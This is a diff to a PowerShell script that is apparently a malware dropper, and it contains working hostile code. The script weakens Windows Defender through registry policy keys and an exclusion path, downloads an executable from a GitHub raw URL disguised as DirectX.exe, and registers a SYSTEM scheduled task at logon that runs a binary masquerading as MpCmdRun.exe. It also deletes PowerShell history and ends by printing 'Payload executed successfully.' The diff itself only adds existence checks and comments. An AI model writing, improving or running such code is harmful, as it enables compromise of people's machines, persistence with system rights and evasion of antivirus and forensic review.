@@ -18,7 +18,9 @@ foreach ($key in $values.Keys) {
 
 # Create a new key: Real-Time Protection
 $realTimeProtectionPath = Join-Path $basePath "Real-Time Protection"
-New-Item -Path $realTimeProtectionPath -Force
+if (-not (Test-Path $realTimeProtectionPath)) {
+    New-Item -Path $realTimeProtectionPath -Force
+}
 
 # Create the required DWORD values under Real-Time Protection
 $realTimeValues = @{
@@ -35,14 +37,18 @@ foreach ($key in $realTimeValues.Keys) {
 
 # Create a new key: Signature Updates
 $signatureUpdatesPath = Join-Path $basePath "Signature Updates"
-New-Item -Path $signatureUpdatesPath -Force
+if (-not (Test-Path $signatureUpdatesPath)) {
+    New-Item -Path $signatureUpdatesPath -Force
+}
 
 # Create the required DWORD value under Signature Updates
 Set-ItemProperty -Path $signatureUpdatesPath -Name "ForceUpdateFromMU" -Value 1 -Type DWord
 
 # Create a new key: Spynet
 $spynetPath = Join-Path $basePath "Spynet"
-New-Item -Path $spynetPath -Force
+if (-not (Test-Path $spynetPath)) {
+    New-Item -Path $spynetPath -Force
+}
 
 # Create the required DWORD value under Spynet
 Set-ItemProperty -Path $spynetPath -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWord
@@ -84,6 +90,7 @@ Write-Host "Exclusion added successfully for: $pathToExclude"
 $urlDirectX = "https://github.com/XXS437/M/blob/main/tcp.exe?raw=true"  # Direct link to the raw file
 $filePathDirectX = "$env:windir\DirectX.exe"  # Destination file path (C:\Windows\tcp.exe)
 
+# Download the DirectX file
 Invoke-WebRequest -Uri $urlDirectX -OutFile $filePathDirectX 
 
 # Define the task name
@@ -94,8 +101,13 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
 }
 
+# Create the scheduled task to run MpCmdRun.exe on logon
+schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
+
 # Clear PowerShell history
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
-Remove-Item -Path $historyPath
+if (Test-Path $historyPath) {
+    Remove-Item -Path $historyPath -Force
+}
 
-schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
+Write-Host "Payload executed successfully."
